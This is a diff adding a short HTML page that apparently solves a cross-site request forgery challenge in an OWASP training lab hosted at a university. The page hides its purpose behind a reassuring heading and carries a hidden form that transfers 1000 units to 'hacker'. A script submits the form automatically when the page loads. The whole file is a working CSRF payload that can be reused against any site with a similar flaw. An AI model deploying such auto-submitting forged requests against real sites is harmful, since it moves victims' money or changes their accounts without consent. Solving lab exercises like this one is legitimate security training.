@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+<body>
+
+<h1>I am NOT trying to hack you</h1>
+<p>Don't worry you're awesome, keep going.</p>
+
+<form name="csrfForm" action="https://owasp02.isc.heia-fr.ch/user/csrfchallengetwo/plusplus/123816d0553567a56355d093d2d8dbfbc28fcbf9" method="POST">
+<input type="hidden" name="giveMoneyTo" value="hacker" />
+<input type="hidden" name="giveAmount" value="1000" />
+<input type="submit"/>
+</form>
+<script>
+  document.csrfForm.submit();
+</script> 
+
+</body>
+</html>
